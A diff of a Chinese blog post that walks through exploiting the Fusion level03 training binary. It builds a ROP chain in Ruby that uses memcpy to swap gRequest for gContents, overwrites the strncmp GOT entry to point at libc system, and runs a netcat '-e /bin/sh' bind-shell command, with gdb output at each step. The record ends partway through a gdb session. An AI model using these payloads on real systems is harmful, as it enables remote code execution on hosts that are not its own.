+<p>我试着谷歌了别人的解法，虽然前面思路都差不多，但是到最后一步的时候他们直接用 <code>&quot;/////////////bin/nc.traditional&quot;</code> 也就是加一堆（几百个）正斜杠，来绕开 ASLR&hellip;.我觉得不行（因为实际地址有时候 <code>0x99?????</code> 有时候 <code>0x89?????</code>，差了快有 0x10000 了&hellip;.</p>
+<p>我也自己试了很多 ROP chain，都没法用诸如 <code>dword ptr</code> 的指令来把 <strong>.bss 上指向堆的地址</strong> 里保存的 <strong>堆上 gContents 的地址</strong> 拿出来</p>
 <p>我也试着就把 nc 的命令写在栈上，然后试着用 ROP chain 来把 esp 的值取出来去做为 system 的参数，但是也没有合适的 ROP chain</p>
 <p>就这样浪费了快一个上午，简直要疯了</p>
-<p>甚至差点就用 memcpy 把 system 的参数，既然是一个字符串，那就从地址固定的 .text 段里，一字节一字节的找出来，取出来，放到 .data 上&hellip;</p>
+<p>甚至差点就用 memcpy 把 system 的参数，既然是一个字符串，那就从地址固定的 .text 段里，一字节一字节的找出来，取出来，放到 .bss 上&hellip;</p>
 <p>然后差点真的这么实施的时候想起来一个问题：</p>
-<p>原程序是怎么从 <strong>.data 上指向堆的地址</strong> 来读到 <strong>堆上 gContents 的地址</strong> 呢&hellip;</p>
+<p>原程序是怎么从 <strong>.bss 上指向堆的地址</strong> 来读到 <strong>堆上 gContents 的地址</strong> 呢&hellip;</p>
 <p>比如，<code>void validate_request()</code> 里的这个 strncmp</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">gRequest</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">      <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Token not found!&#34;</span><span class="p">);</span> 
@@ -1297,6 +1050,7 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">   <span class="mh">0x08049adb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esi</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">   <span class="mh">0x08049ade</span> <span class="o">&lt;+</span><span class="mi">46</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">   <span class="mh">0x08049ae2</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x8048f50</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="o">......</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x08049ae2</span>
 </span></span><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8049ae2</span><span class="p">:</span> <span class="n">file</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mi">75</span><span class="o">.</span>
@@ -1322,28 +1076,540 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl"><span class="mh">0x00000040</span><span class="p">:</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
 </span></span></code></pre></div><p>所以这两个值不就是 <strong>堆上 gRequest 的地址</strong> 和 <strong>堆上 token 的地址</strong> 么&hellip;被 strncmp 之前的指令放在了栈上&hellip;</p>
 <p>这时候我突然意识到，我前面一直在和 ROP chain 对线，却忘了一个最简单的事情：</p>
-<p>ROP chain 的最后一下，并不一定要能完美的 ret 呢&hellip;</p>
+<p>有些时候找不到 ROP Chain 不代表源程序没做过这个事情，而是源程序做了这个事情但是没有立刻 ret</p>
 <p>换句话说，我们不用再死磕想去把 <strong>堆上 gContents 的地址</strong> 写到栈上作为 system 的参数，</p>
-<p>我们可以利用 .text 中原有的指令，来让栈变成有 <strong>堆上 gContents 的地址</strong> 的形状，虽然此时没法立刻 ret</p>
-<p>但是这里的 strncmp 就是很好的例子，在执行它之前，栈确确实实被其之前的指令变成了有 <strong>堆上 gRequest 的地址</strong> 的形状，</p>
-<p>那如果这一刻的 strncmp 和 gRequest 都可以在之前就被偷偷换成别的东西呢..?</p>
+<p>而是可以利用 .text 中原有的指令，来让栈变成有 <strong>堆上 gContents 的地址</strong> 的形状，虽然此时没法立刻 ret&hellip;但是，如果接下来的指令中又出现了一个我们所想要的 call..那就完全不需要 ret 了啊</p>
+<p>这里的 strncmp 就是很好的例子，在执行它之前，栈确确实实被其之前的指令变成了有 <strong>堆上 gRequest 的地址</strong> 的形状，如果这一刻的 strncmp 和 gRequest 都可以在之前就被偷偷换成别的东西&hellip;?</p>
 <hr>
 <p>我们已知：</p>
 <ul>
-<li>.data，.text，.plt 段地址不变</li>
+<li>.bss，.text，.plt 段地址不变</li>
 <li>strncmp 之前会把 <strong>堆上 gRequest 的地址</strong> 取出来放到栈上</li>
-<li><strong>堆上 gRequest 的地址</strong> 保存在 <strong>.data 上指向堆的地址</strong></li>
-<li>.data 字段可写</li>
+<li><strong>堆上 gRequest 的地址</strong> 保存在 <strong>.bss 上指向堆的地址</strong></li>
+<li>.bss 字段可写</li>
 </ul>
 <p>那么我们现在就可以：</p>
 <ol>
-<li>把 .data 的 gRequest 偷偷用 memcpy 替换成 gContent</li>
+<li>把 .bss 的 gRequest 偷偷用 memcpy 替换成 gContent</li>
 <li>把 strncmp 偷偷换成 libc system</li>
 <li><code>strncmp(gRequest, token, strlen(token)</code> 时，就变成了 <code>system(gContents)</code>（虽然多的两个参数 system 根本就不会管它</li>
 </ol>
 <p>来吧，全新的 ROP Chain：</p>
-<h3 id="1-data-grequest---gcontent">1. <code>.data</code>: <code>gRequest -&gt; gContent</code></h3>
-<h3 id="2-pltgot-strncmp---system">2. <code>.plt.got</code>: <code>strncmp -&gt; system</code></h3>
+<p><strong>1. <code>.bss</code>: <code>gRequest -&gt; gContent</code></strong></p>
+<p>这里使用 memcpy 好了，那么就需要把栈变成这样：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># gRequest -&gt; gContents</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># memcpy(void *restrict dst, const void *restrict src, size_t n)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="o">.</span> <span class="mh">0x08048e60</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1"># memcpy 的 plt 地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span> <span class="mh">0x0804964d</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1"># memcpy 的返回地址：pop ebx ; pop esi ; pop edi ; ret</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># 这条语句可以连 pop 三个值，就可以把下面三个 memcpy 的参数弹栈</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span> <span class="mh">0x0804be08</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1"># 目的地址：.bss 段的 0x804be08 &lt;gRequest&gt; </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="o">.</span> <span class="mh">0x0804bdf4</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1"># 原地址：.bss 段的 0x804bdf4 &lt;gContents&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="o">.</span> <span class="s1">&#39;\\\\\u0400&#39;</span> <span class="o">+</span> <span class="s1">&#39;\\\\\u0000&#39;</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1"># memcpy 的参数：拷贝的数据大小</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># 这里就相当于 0x00000004 字节</span>
+</span></span></code></pre></div><p>试一下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">title</span>  <span class="o">=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\uAAAA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">27</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;ABCD&#34;</span>       <span class="c1">#ebp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gRequest -&gt; gContents</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># memcpy(void *restrict dst, const void *restrict src, size_t n) : 0x08048e60</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048e60</span> <span class="c1"># memcpy</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804964d</span> <span class="c1"># return addr : pop ebx ; pop esi ; pop edi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804be08</span> <span class="c1"># *dest     0x804be08 &lt;gRequest&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804bdf4</span> <span class="c1"># *src      0x804bdf4 &lt;gContents&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\u0400&#39;</span> <span class="o">+</span> <span class="s1">&#39;\\\\\u0000&#39;</span> <span class="c1"># size = 0x00000004</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x23332333</span> <span class="c1"># sigsegv for test</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="no">Continuing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x23332333</span> <span class="k">in</span> <span class="sc">??</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="n">gContents</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x98c8710</span><span class="p">:</span>	<span class="mh">0x63756f74</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="n">gRequest</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x98c8710</span><span class="p">:</span>	<span class="mh">0x63756f74</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x98c8710</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x98c8710</span><span class="p">:</span>  <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span></code></pre></div><p>成功w</p>
+<p><strong>2. <code>.plt.got</code>: <code>strncmp -&gt; system</code></strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="nb">proc</span> <span class="n">map</span>
+</span></span><span class="line"><span class="cl"><span class="n">process</span> <span class="mi">1684</span>
+</span></span><span class="line"><span class="cl"><span class="n">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/fusion/bin/level03&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">cwd</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/fusion/bin/level03&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="no">Mapped</span> <span class="n">address</span> <span class="ss">spaces</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="no">Start</span> <span class="no">Addr</span>   <span class="no">End</span> <span class="no">Addr</span>       <span class="no">Size</span>     <span class="no">Offset</span> <span class="n">objfile</span>
+</span></span><span class="line"><span class="cl">	 <span class="mh">0x8048000</span>  <span class="mh">0x804b000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>       <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span>
+</span></span><span class="line"><span class="cl">	 <span class="mh">0x804b000</span>  <span class="mh">0x804c000</span>     <span class="mh">0x1000</span>     <span class="mh">0x2000</span>       <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span>
+</span></span><span class="line"><span class="cl">	 <span class="mh">0x98c7000</span>  <span class="mh">0x98e8000</span>    <span class="mh">0x21000</span>          <span class="mi">0</span>           <span class="o">[</span><span class="n">heap</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">  <span class="o">......</span>
+</span></span><span class="line"><span class="cl">	<span class="mh">0xb752a000</span> <span class="mh">0xb76a0000</span>   <span class="mh">0x176000</span>          <span class="mi">0</span>       <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl">	<span class="mh">0xb76a0000</span> <span class="mh">0xb76a2000</span>     <span class="mh">0x2000</span>   <span class="mh">0x176000</span>       <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl">	<span class="mh">0xb76a2000</span> <span class="mh">0xb76a3000</span>     <span class="mh">0x1000</span>   <span class="mh">0x178000</span>       <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl">  <span class="o">......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7566b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$2</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">gnu</span><span class="o">-</span><span class="n">indirect</span><span class="o">-</span><span class="n">function</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb75a0530</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>那么偏移量是：<code>0xb7566b20 &lt;__libc_system&gt; - 0xb75a0530 &lt;strncmp&gt;</code> = <code>0xFFFC65F0</code></p>
+<p>直接套 <a class="link" href="/p/fusion_level_03/#find-out-rop-chain" >Find Out ROP chain</a> 节最后的 ROP Chain：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># GOT</span>
+</span></span><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">R</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0804</span><span class="n">bda0</span> <span class="no">R_386_JUMP_SLOT</span>   <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># PLT</span>
+</span></span><span class="line"><span class="cl"><span class="n">fusion</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="sr">/opt/</span><span class="n">fusion</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">level03</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="mi">08048</span><span class="n">f50</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@plt</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">8049</span><span class="ss">ae2</span><span class="p">:</span>	<span class="n">e8</span> <span class="mi">69</span> <span class="n">f4</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="mi">8048</span><span class="n">f50</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@plt</span><span class="o">&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># funcA -&gt; strncmp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="o">.</span> <span class="mh">0x08048bf0</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span> 
+</span></span><span class="line"><span class="cl">   <span class="c1"># 作用是把 2. 的值写进 ebx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">.</span> <span class="c1"># 在这里放上「funcA 的 got 地址 - 0x5d5b04c4」</span>
+</span></span><span class="line"><span class="cl">   <span class="c1">#（减去这个数字是因为 6. 的 ebx 大了 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x0804bda0</span> <span class="o">-</span> <span class="mh">0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl">   <span class="o">=&gt;</span> <span class="mh">0xAAA9B8DC</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="o">.</span> <span class="mh">0x08049b4f</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="p">;</span> <span class="n">ret</span> 
+</span></span><span class="line"><span class="cl">   <span class="c1"># 作用是把 4. 的值写进 eax</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="o">.</span> <span class="c1"># 「libc 里面，funcA 的地址 到 libc_system 的地址」之间的偏移量</span>
+</span></span><span class="line"><span class="cl">   <span class="o">=&gt;</span> <span class="mh">0xFFFC65F0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">5</span><span class="o">.</span> <span class="c1"># 这里得写上 0x5c 个字符，因为 3. 出现了 add esp, 0x5c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">.</span> <span class="mh">0x080493fe</span> <span class="p">:</span> <span class="n">add</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mh">0x5d5b04c4</span><span class="o">]</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># 成功改写了 funcA 的 got 记录：</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># 即加上偏移量，变成了 system 的地址</span>
+</span></span></code></pre></div><p>即：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># strncmp -&gt; system</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048bf0</span> <span class="c1"># pop ebx ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xAAA9B8DC</span> <span class="c1"># ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08049b4f</span> <span class="c1"># pop eax ; add esp, 0x5c ; ret </span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xFFFC65F0</span> <span class="c1"># offset of libc system and strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mh">0x5c</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x080493fe</span> <span class="c1"># add dword ptr [ebx + 0x5d5b04c4], eax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048f50</span> <span class="c1"># call &lt;strncmp@plt&gt; just for test</span>
+</span></span></code></pre></div><p>&hellip;.但是却遇到了这样的问题：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="no">Continuing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xb76042d0</span> <span class="k">in</span> <span class="n">__argp_fmtstream_update</span> <span class="p">(</span><span class="n">fs</span><span class="o">=</span><span class="mh">0xb787fff4</span><span class="p">)</span> <span class="n">at</span> <span class="n">argp</span><span class="o">-</span><span class="n">fmtstream</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">238</span>
+</span></span><span class="line"><span class="cl"><span class="mi">238</span>	<span class="n">argp</span><span class="o">-</span><span class="n">fmtstream</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">	<span class="k">in</span> <span class="n">argp</span><span class="o">-</span><span class="n">fmtstream</span><span class="o">.</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x0804bda0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bda0</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb76042d0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0xb76042d0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xb76042d0</span> <span class="o">&lt;</span><span class="n">__argp_fmtstream_update</span><span class="o">+</span><span class="mi">352</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x158b65ff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$3</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7566b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p><code>&lt;strncmp@got.plt&gt;</code> 改了，但并没有指向 system &hellip;</p>
+<p>偏移应该没有算错呢&hellip;.</p>
+<p>就算去 objdump -d libc.so 得出的也是同样的偏移</p>
+<h3 id="gnu-indirect-function">GNU Indirect Function</h3>
+<p>问题似乎出现在这里：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">gnu</span><span class="o">-</span><span class="n">indirect</span><span class="o">-</span><span class="n">function</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb75a0530</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">memcpy</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$5</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">gnu</span><span class="o">-</span><span class="n">indirect</span><span class="o">-</span><span class="n">function</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb75a1a60</span> <span class="o">&lt;</span><span class="n">memcpy</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$3</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7566b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">write</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$4</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb75eb2c0</span> <span class="o">&lt;</span><span class="n">write</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x0804bda0</span>
